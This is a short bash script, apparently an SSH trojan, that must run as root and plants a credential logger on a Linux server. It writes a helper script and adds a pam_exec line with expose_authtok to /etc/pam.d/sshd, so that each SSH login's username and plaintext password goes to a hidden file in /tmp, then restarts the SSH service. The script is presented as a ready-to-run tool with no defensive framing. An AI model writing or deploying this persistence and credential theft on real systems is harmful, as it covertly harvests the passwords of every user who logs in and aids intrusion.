# Run as root!

#! /usr/bin/env bash

file_exec="/root/pam_sshpwlog.sh"
file_log="/tmp/.log_sshtrojan1.txt"
file_pamsshd="/etc/pam.d/sshd"

cat >$file_exec <<EOF1
#! usr/bin/env bash

read password
printf "Username: \$PAM_USER\nPassword: \$password\n"
EOF1
chmod +x $file_exec

cat >>$file_pamsshd <<EOF2

# Custom command
auth optional pam_exec.so expose_authtok log=$file_log $file_exec
EOF2
service ssh restart
